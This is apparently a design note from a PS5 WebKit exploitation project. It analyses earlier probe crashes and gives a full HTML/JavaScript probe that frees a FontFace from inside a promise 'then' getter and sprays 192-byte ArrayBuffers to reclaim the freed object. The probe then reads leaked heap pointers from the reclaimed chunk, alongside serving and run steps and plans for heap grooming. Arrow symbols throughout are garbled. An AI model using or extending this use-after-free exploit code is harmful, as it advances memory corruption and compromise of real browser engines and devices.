# P666 — Batch Forensics (display:auto, zero in-window beacons, hash variants)

Date: 2026-11-11 (forensic validation turn)
Target: `probes/phase13_webkit/p666-batch-forensics.html` (route `/p666`, root `/`)

## 1. Why p666 exists — corrected reading of p663/p664/p665

Full re-read of the three probes and their beacon logs changed the picture that
motivated p664/p665:

| Claim (working narrative) | Verdict | Evidence |
|---|---|---|
| "p663 completed R0-R3 reliably with hits each round" | **FALSE** | `beacons_1171a6ad-03d3-4338-8a2f-8786304d4ccc.log`: ~95 STARTs; only ONE run (23:49:15) ever emitted SUMMARY/ALIVE. Most loads show `START 뿯↽ R0 뿯↽ (silence) 뿯↽ START` ≈2.5 s later = death inside the R1 window. |
| "p663 R0-R3 with hits each round" (per-round) | **FALSE as stated** | p663 R1 is MISS in **29/29** runs that beaconed R1 — a structural parity law (even rounds hit, odd rounds miss), NOT an anomaly. R2 hits with `rc=103` (seed 100+2 뿯↽ engine +1). |
| "p665 R1 MISS is explained by beacon-in-window interference (XHR steals the 192B chunk)" | **REFUTED (chronology + baseline)** | (a) Chronology: in `p665-r1death-bisect.html` the getter emits S5 at entry (**before** `sty.remove`/`fonts.delete` = before the free) and S6 **after** the spray loop. No XHR ever executes between the free and the first `new ArrayBuffer(192)`. (b) Baseline: p663 had zero in-window XHRs and still missed R1 in 100% of recorded runs. |
| "p664 = 8 loads, all died in round 1" | **Partially wrong count** | p664 log has **12** STARTs; 8 produced R0 (all hit lane 2, static dump), 4 died before R0 analysis. All 8 R0-loads died before R1 analysis. |
| "p665: R0 hit, R1 MISS, R2 silent death — every load" | **Incomplete** | 13 STARTs: 4 died pre-R0; **4 died right after r1's S6** (p664-style death, no R1 beacon — cluster A); 4 did the full R1-MISS 뿯↽ R1LATE 뿯↽ r2-S6 뿯↽ silent death (cluster B). Two death modes, same signature: death lands in the ~150 ms after a round's post-spray engine write. |
| T anchor determinism | **Refined** | T_R0 = `0x10001cb170` holds across p663 (2026-11-10 23:37-23:49) AND p665 (2026-11-11 19:54) — it is a *first-WebProcess-generation* constant, not merely per-generation. After a WebProcess restart both probes drift into the same band `0x10008a4xxx-0x10008d4xxx` (p663 R2 T values: `0x1000891410/0x1000899410/0x1000895410/0x100089d410` — all `...410` = the m_clients HashTable allocation; p664 R0: `0x10008a4060..0x10008b0060`). |

## 2. Timer reconciliation verdict (source-pinned)

The "3 s timeout-timer timebomb on the forged +0x90" is **real as a mechanism but
unreachable in this trigger flow**:

1. `display:auto` 뿯↽ `fontLoadTiming() = {block: 3 s, swap: ∞}` — `CSSFontFace.cpp:546-568` (Auto/Block 뿯↽ `{3_s, infinity()}` at :551-552).
2. `setStatus(Loading)` with finite block 뿯↽ `m_timeoutTimer.startOneShot(3s)` — `CSSFontFace.cpp:610-614`. The timer object lives INSIDE CSSFontFace at **+0x90** (validated layout), so arming writes through the object pointer, and firing later is a virtual call on its vptr.
3. `src:local()` loads complete **synchronously inside `pump(Allow)`**: source Pending 뿯↽ `source->load(document())` (`CSSFontFace.cpp:665-668`) 뿯↽ Success case 뿯↽ `setStatus(Success)` (`CSSFontFace.cpp:683-686`).
4. `setStatus(Success)` 뿯↽ `m_timeoutTimer.stop()` — `CSSFontFace.cpp:622-625`. `TimerBase::stop()` 뿯↽ `setNextFireTime(0)` 뿯↽ heap delete (`Timer.cpp:276-289`), the `ThreadTimerHeapItem`'s only heap reference drops, nothing dangles.
5. **Ordering:** Success also resolves the wrapper's loaded promise with the FontFace object (`FontFace.cpp:332-343`, `m_loadedPromise->resolve(*this)` at :341-342). The probe's `then` getter (the free) runs in the **microtask that follows** — strictly AFTER Success already stopped the timer.

뿯↽ At free time the face's own timer is always inactive for `local()` sources. That
is exactly why p664/p665 R0LATE survived 3.35 s+ with `changed=no` and zero
writes at +0x90..: **nothing ever writes there in this flow.** (If a timer were
left armed, `ThreadTimers.cpp:101-137` would fire it via `item->timer().fired()`
— a vcall through the freed +0x90 vptr — the heap-item is a separate allocation
with a raw `TimerBase* m_timer` back-pointer, `Timer.cpp:59-67`; the null-sweep
at `ThreadTimers.cpp:113-116` only catches items whose timer destructor ran,
which never happens for a freed-while-armed object.)

**Consequence:** the R1/R2 deaths in ALL of p663/p664/p665 are NOT the timer.
The surviving explanation, consistent with every beacon: on hit rounds the
stale-ref engine write lands in a sprayed lane (readable, benign); on miss
rounds it lands in a **foreign live object** (corruption) and detonates at the
next round's post-spray write — matching cluster A (instant, <150 ms) and
cluster B (next round) of p665, p664's 0/8, and p663's majority R1-window
deaths.

## 3. Hypothesis table

| # | Hypothesis | Status before p666 | p666 test |
|---|---|---|---|
| H1 | R1 MISS is engine-structural (parity law), independent of beacon XHRs | Supported by p663 (29/29) | #sp24 reproduces MISS with zero in-window allocations |
| H2 | Death requires the engine write through a stale ref into a RECLAIMED (sprayed) lane context; without spray the write corrupts a foreign object and is equally/more fatal | Untested | #nosp: free with no reclaim — survival 뿯↽ reclaim implicated; death 뿯↽ stale write alone lethal |
| H3 | In-window XHRs (p665 S5/S6) aggravated/shifted death timing | Weak (chronology already broken) | #sp24 vs p665: if p666 reaches R1 beacon at ≥ p663's ~31% rate, S-beacons were not protective/harmful |
| H4 | Spray width controls hit probability/parity | Untested | #sp12 vs #sp24 hit-lane distribution |
| H5 | Late writes at +0x90.. (timer fields) or +0x82 (status) exist under auto | Refuted by p664/p665 dumps, keep falsifying | DUMP2 at +3500 ms every round |
| H6 | Round-over-round state (faces kept alive, results array) contributes to death by R4 | p663's ROUNDS=4 comment, unverified | All variants run exactly 4 rounds + SUMMARY/ALIVE |

## 4. Design

Exact p663 machinery (display auto everywhere, `local(Arial)`/`local(Helvetica)`,
24뿯½192 B seeded spray default, ROUNDS=4, faces kept alive) with three additions:

1. **Batch-only beacons.** `emit()` never auto-flushes; the getter contains ZERO
   emits (only a memory flag `gfired`). Flushes happen exclusively at:
   START, after the +150 ms analysis readout (R line + DUMP1), at the +3500 ms
   LATE readout (DUMP2), on `window.onerror`, and SUMMARY/ALIVE. The +150 ms
   flush position is IDENTICAL to p663's — parity behavior stays comparable.
2. **Full 192 B dump of the hit lane every round**: DUMP1 at +150 ms, DUMP2 at
   +3500 ms (past the old auto block=3 s mark), with `changed=` diff flag.
   T and W recorded EVERY round (hit 뿯↽ leaked pointers; miss 뿯↽ `-`).
3. **Hash micro-variants**: `#nosp` (no spray), `#sp12`, `#sp24` (default).

Round cadence: t0 trigger 뿯↽ t0+150 analyze/flush 뿯↽ t0+3500 late/flush 뿯↽
t0+3750 next round. 4 rounds ≈ 15 s + summary.

## 5. Expected outcomes per variant

| Variant | Expected | Meaning if observed |
|---|---|---|
| #sp24 | R0 hit (T_R0 = 0x10001cb170 first-gen), R1 = MISS (if R1 beacon arrives at all — death may preempt it), R2 hit rc=103, R3 MISS; most loads die in an R1/R2 post-write window; DUMPs show only {+0x00,+0x08,+0x58,+0x68} non-zero, static to +3500 ms | Parity law + write-set confirmed with zero in-window interference; p663 baseline re-established |
| #sp24 deviation | R1 HIT sometimes | Parity is not iron; previous misses were allocation-lottery 뿯↽ groom p667 to bias the lottery |
| #nosp | Death at R0/R1 (foreign corruption) with ALIVE never beaconed | Free alone 뿯↽ stale write is already a lethal corruption primitive on miss rounds |
| #nosp deviation | All 4 rounds + ALIVE | The sprayed reclaim itself is part of the kill vector; free alone benign 뿯↽ separate the two in p667 |
| #sp12 | R0 misses or hit-lane > available window shifts; parity maybe broken | Spray width is a control knob for the reclaim distance |

## 6. Decision tree

```
Run #sp24 x10 loads (fresh WebProcess per load, as before):
├─ R1 beacon rate ≈ p663 (~30%)?
│   ├─ YES + R1 always MISS ........ H1 confirmed. Kill the XHR theory for good.
│   │   └─ Next: p667 = pre-groom odd rounds (defragment 192B freelist head
│   │       before R1's getter) to force R1 hit; goal = 4/4 hit rounds.
│   └─ NO (R1 hits sometimes) ...... Parity softer than believed 뿯↽ allocation
│       lottery; instrument per-lane marker ordering (seeds already encode it).
├─ Any DUMP2 changed=YES?
│   ├─ YES .......................... NEW SIGNAL: late engine write through
│   │   stale ref (post-3 s). Capture offsets; reconcile against member map.
│   └─ NO ........................... H5 stays refuted; timer path stays dead.
└─ Run #nosp x6 loads:
    ├─ dies ≤ R1 ..................... stale write alone = lethal primitive;
    │   reclaim quality is the ONLY lever. Priority: deterministic reclaim.
    └─ survives 4 rounds ............. reclaim participates in lethality;
        #sp12 x6 to bound reclaim distance (hit lane ≤ 11 뿯↽ distance < 12 chunks).
```

## 7. The probe file

`probes/phase13_webkit/p666-batch-forensics.html` (identical content; write
then convert to UTF-8, see 뿯½9):

```html
<!--
  p666: batch forensics — p663-exact machinery (display:auto, zero beacons in
  the free->spray window) + full 192B dumps + hash-selected spray variants.

  Why: p665's in-window S-beacons (S5/S6 sync XHR) confounded the death-point
  data; and the p663 log re-read shows R1 MISS in 29/29 beaconed runs with NO
  in-window XHR at all (parity law: even rounds hit / odd rounds miss). p666
  restores the clean p663 baseline and adds only post-analysis forensic depth.

  Per round r (t0 = fonts.load trigger):
    t0        getter: sty.remove + fonts.delete + offsetHeight + spray (NO emit)
    t0+150ms  analyze: scan lanes; R-r line (hit|miss, T, W, rc, opc, st82, gf)
              + DUMP1 (nonzero qwords of hit lane) -> flush (outside every
              critical window; the engine write lands well before +150ms)
    t0+3500ms LATE: DUMP2 + diff flag -> flush (past the auto block=3s mark;
              p664/p665 never saw any +0x90.. write here — keep verifying)
    t0+3750ms next round
  Variants (location.hash):
    #nosp — getter frees but never sprays: does the unreclaimed stale write
             alone kill the page? (isolates free from reclaim)
    #sp12 — 12 lanes (spray-width sensitivity)
    #sp24 — 24 lanes, DEFAULT (p663 parity)
  ROUNDS = 4 (p663 parity). Faces kept alive (p656b law).
  Beacon: P666-.  CRASH_CLASS: HIGH (R1/R2 death expected — that IS the datum).
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p666</title></head>
<body>p666: batch forensics (auto, variant via hash)
<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
<script>
(function() {
'use strict';
var L = document.getElementById('log');
var bQ = [];
function emit(tag, msg) {            /* batch-only: never auto-flush */
  var s = tag + (msg ? ' ' + msg : '');
  L.textContent += s + '\n';
  bQ.push(s);
}
function flush() {                    /* only called at safe points */
  while (bQ.length) {
    var b = bQ.splice(0, 2).join('|');
    try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P666-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
  }
}
window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

var h = (location.hash || '').toLowerCase();
var VARIANT = h.indexOf('nosp') >= 0 ? 'nosp' : (h.indexOf('sp12') >= 0 ? 'sp12' : 'sp24');
var LANES   = VARIANT === 'nosp' ? 0 : (VARIANT === 'sp12' ? 12 : 24);

emit('START', 'batch-forensics r4 ' + VARIANT + ' lanes=' + LANES);
flush();

var ROUNDS = 4;
var round = 0;
var results = [];
var gfired = -1;                      /* getter fired for this round (memory only) */

var sty = null, ff = null;
var armed = false;
var spray = [];
var snap1 = null;

Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (!armed) return undefined;
    armed = false;
    gfired = round;                   /* in-window: memory only, NO emit */
    try { sty.remove(); } catch(e) {}
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;
    spray = [];
    for (var i = 0; i < LANES; i++) {
      var ab = new ArrayBuffer(192);
      var dv = new DataView(ab);
      dv.setUint32(0x00, 100 + round, true);
      dv.setUint32(0x04, 0x5A5A0000 | round, true);
      dv.setUint32(0x08, i, true);
      spray.push(dv);
    }
    return undefined;
  },
  set: function() {}
});

function dumpLane(dv) {
  var out = [];
  for (var off = 0; off <= 0xB8; off += 8) {
    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
  }
  return out.join(',');
}

function scanHit() {
  for (var i = 0; i < spray.length; i++) {
    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
  }
  return -1;
}

function beginRound() {
  sty = document.createElement('style');
  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
  document.head.appendChild(sty);
  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(ff);
  void ff.loaded;
  window.__facesAlive = window.__facesAlive || [];
  window.__facesAlive.push(ff);
  armed = true;
  document.fonts.load('1em f' + round + ', s' + round, 'AB');
  setTimeout(analyzeEarly, 150);
  setTimeout(analyzeLate, 3500);
}

function analyzeEarly() {
  try {
    var hit = scanHit();
    if (VARIANT === 'nosp') {
      emit('R' + round, 'nosp gf=' + gfired + ' alive');
      results.push({ r: round, lane: -1, t: '-', w: '-' });
    } else if (hit < 0) {
      emit('R' + round, 'MISS gf=' + gfired);
      results.push({ r: round, lane: -1, t: '-', w: '-' });
    } else {
      var dv = spray[hit];
      snap1 = dumpLane(dv);
      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
      var dirtyNear = 0;
      for (var j = Math.max(0, hit - 3); j <= Math.min(spray.length - 1, hit + 3); j++) {
        if (spray[j].getUint32(0x58, true) !== 0 || spray[j].getUint32(0x5C, true) !== 0) dirtyNear++;
      }
      results.push({ r: round, lane: hit, t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo) });
      emit('R' + round, 'hit=' + hit + ' T=' + hex32(tHi) + hex32(tLo) +
           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
           ' opc=' + dv.getUint32(0x60, true) + ' st82=' + dv.getUint8(0x82) +
           ' gf=' + gfired + ' dirtyNear=' + dirtyNear);
      emit('R' + round + 'DUMP1', snap1.slice(0, 700));
    }
    flush();                          /* post-analysis only: data escapes here */
  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
}

function analyzeLate() {
  try {
    var hit = scanHit();
    if (VARIANT !== 'nosp' && hit >= 0 && spray.length) {
      var dv = spray[hit];
      var snap2s = dumpLane(dv);
      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
           ' rc=' + dv.getUint32(0x00, true) +
           ' changed=' + (snap1 !== snap2s ? 'YES' : 'no'));
      if (snap1 !== snap2s) emit('R' + round + 'DUMP2', snap2s.slice(0, 700));
    } else {
      emit('R' + round + 'LATE', 'alive (' + (VARIANT === 'nosp' ? 'nosp' : 'miss-round') + ')');
    }
    flush();
    round++;
    if (round < ROUNDS) {
      gfired = -1;
      setTimeout(beginRound, 250);
    } else {
      var ts = {}, lanes = [];
      for (var k = 0; k < results.length; k++) {
        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
        lanes.push(results[k].lane);
      }
      var keys = Object.keys(ts);
      emit('SUMMARY', VARIANT + ' rounds=' + results.length + ' distinctT=' + keys.length +
           ' lanes=[' + lanes.join(',') + ']');
      for (var q = 0; q < keys.length; q++) emit('TVAL', keys[q] + ' x' + ts[keys[q]]);
      emit('ALIVE', 'end-r4-' + VARIANT);
      flush();
    }
  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
}

setTimeout(beginRound, 50);

})();
</script>
</body></html>
```

Deltas vs p663 (complete list): batched `emit` (no auto-flush at ≥2), flush
points only at START/analysis/LATE/summary/onerror; `gfired` memory marker in
the getter; `dumpLane`/`scanHit`/`snap1` DUMP1/DUMP2 machinery (+3500 ms LATE
pass — p663 had none); R line gains `opc`, `st82`, `gf`, `dirtyNear` retained;
`results[]` records misses too (`t:'-'`); variant parse from `location.hash`;
SUMMARY drops `spread` (lanes list retained); everything else byte-identical to
p663 (style string, FontFace args, load string, seeds, offsets, ROUNDS=4,
faces-alive law, 150 ms analysis).

## 8. serve.py

`tools/browser_runner/serve.py` STATIC dict head becomes:

```python
STATIC = {
    '/' : PROJECT / 'probes' / 'phase13_webkit' / 'p666-batch-forensics.html',
    '/p666': PROJECT / 'probes' / 'phase13_webkit' / 'p666-batch-forensics.html',
    '/p665': PROJECT / 'probes' / 'phase13_webkit' / 'p665-r1death-bisect.html',
    ...rest unchanged...
```

STATIC is read at import — **restart serve.py after the edit** (routes are not
hot-reloaded).

## 9. UTF-8 note (known repo issue)

The writing tool emits UTF-16; after writing `P666_DESIGN.md` and
`p666-batch-forensics.html`, convert both (handles either source encoding,
writes UTF-8 without BOM):

```powershell
foreach ($p in @('docs\P666_DESIGN.md','probes\phase13_webkit\p666-batch-forensics.html')) {
  $full = Join-Path 'C:\Users\renat\Projects\PS5-14.10-Research' $p
  $b = [IO.File]::ReadAllBytes($full)
  if ($b.Length -ge 2 -and $b[0] -eq 0xFF -and $b[1] -eq 0xFE) {
    $t = [IO.File]::ReadAllText($full, [Text.Encoding]::Unicode)
  } else { $t = [IO.File]::ReadAllText($full, [Text.Encoding]::UTF8) }
  [IO.File]::WriteAllText($full, $t, (New-Object Text.UTF8Encoding($false)))
}
```

## 10. PS5 run protocol

1. Restart `serve.py`; confirm `/` now serves p666 (title `p666: batch forensics`).
2. **#sp24** (default): 10 reloads of `https://…/` — one fresh WebProcess per
   load as before; wait ≥16 s per load (4 rounds ≈ 15 s) before reloading.
3. **#nosp**: 6 reloads of `https://…/#nosp`.
4. **#sp12**: 6 reloads of `https://…/#sp12`.
5. Grep the new beacon log for: `P666-START` (variant echo), `R0 hit` (T_R0
   anchor), `R1` (beacon presence = survival past r1 write; MISS expected),
   `DUMP2`/`changed=YES` (would be NEW signal), `SUMMARY`/`ALIVE` (full-run
   survival), and silent-stop positions relative to the last beacon of each load.
